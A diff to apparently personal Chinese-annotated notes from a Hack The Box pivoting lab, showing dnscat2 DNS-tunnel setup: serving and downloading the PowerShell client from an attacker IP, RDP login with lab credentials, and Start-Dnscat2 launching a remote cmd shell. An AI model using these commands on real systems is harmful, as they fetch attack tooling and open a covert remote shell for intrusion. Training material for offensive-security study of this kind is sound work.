@@ -251,9 +251,12 @@ sudo bundle install           检查安装
 
 sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache      在攻击机启动服务端
 git clone https://github.com/lukebaggett/dnscat2-powershell.git                                下载客户端
-scp 或传送到跳板
-PS C:\htb> Import-Module .\dnscat2.ps1                                                         安装客户端
-PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd      通过客户端，启动 cmd
+scp 到跳板 或
+python3 -m http.server PWNPO
+xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
+PS C:\htb> (New-Object Net.WebClient).DownloadFile('http://10.10.14.17:9001/dnscat2-powershell/dnscat2.ps1', 'dnscat2.ps1')                   传送到跳板
+PS C:\htb> Import-Module .\dnscat2.ps1                                                                                                        安装客户端
+PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd       通过客户端，启动 cmd
 dnscat2> ?                看帮助
 dnscat2> window -i 1      建立交互 shell
 
